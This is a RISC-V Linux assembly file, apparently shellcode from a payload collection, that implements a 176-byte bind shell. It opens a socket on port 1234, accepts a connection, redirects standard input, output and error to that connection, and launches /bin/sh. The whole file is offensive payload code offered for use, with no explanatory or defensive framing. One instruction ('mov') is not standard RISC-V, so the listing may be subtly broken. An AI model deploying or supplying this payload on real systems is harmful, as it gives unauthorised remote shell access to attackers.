 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
 
    # 176 bytes
 
    .include "include.inc"

    .equ PORT, 1234

    .global _start
    .text

_start:
    addi   sp, sp, -16
    
    # s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    li     a7, SYS_socket
    li     a2, IPPROTO_IP
    li     a1, SOCK_STREAM
    li     a0, AF_INET
    ecall
    
    mv     a3, a0
    
    # bind(s, &sa, sizeof(sa));  
    li     a7, SYS_bind
    li     a2, 16
    li     a1, (((((PORT & 0xFF) << 8) | (PORT >> 8)) << 16) | AF_INET) 
    sd     a1, (sp)
    sd     x0, 8(sp)
    mov    a1, sp
    ecall
  
    # listen(s, 1);
    li     a7, SYS_listen
    li     a1, 1
    mv     a0, a3
    ecall
    
    # r = accept(s, 0, 0);
    li     a7, SYS_accept
    mv     a2, x0
    mv     a1, x0
    mv     a0, a3
    ecall
    
    mv     a4, a0
 
    # in this order
    #
    # dup3(s, STDERR_FILENO, 0);
    # dup3(s, STDOUT_FILENO, 0);
    # dup3(s, STDIN_FILENO,  0);
    li     a7, SYS_dup3
    li     a1, STDERR_FILENO + 1
c_dup:
    mv     a0, a4
    addi   a1, a1, -1
    ecall
    bne    a1, zero, c_dup

    # execve("/bin/sh", NULL, NULL);
    li     a7, SYS_execve
    mv     a2, x0
    mv     a1, x0
    li     a0, BINSH
    sd     a0, (sp)
    mv     a0, sp
    ecall
